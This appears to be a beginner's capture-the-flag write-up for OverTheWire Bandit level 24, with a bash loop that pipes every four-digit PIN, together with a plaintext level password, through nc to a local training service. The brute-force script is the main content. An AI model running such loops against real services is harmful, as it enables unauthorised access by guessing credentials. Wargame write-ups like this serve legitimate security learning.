# OverTheWire - Bandit - Level 24 -> Level 25

## 🎯 Objective
Make a brute force program to find the password

## 🛠️ Tools & Concepts Used
* `nc` - establish a network connection
* `bash` - interactive command interpreter and command language 

## 📝 Step-by-Step Solution

**1. Create the script**
First I has to make the script responsable for solving this problem

```bash
#!/usr/bin/env bash
for i in {0000..9999}; do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done | nc localhost 30002 | grep -v "Wrong"
```
The script is preety stright-forward : for every combination of 4 digits print the password of the last level + the number into the connecton and only dispaly the lines that do not contain the word `Wrong`

**2. Execute the command**
Then, I just ahd to run it

```bash
./script.sh
```

It just outputed the right password for the next level

## 💡 Key Takeaway
Made my first bruteforce program
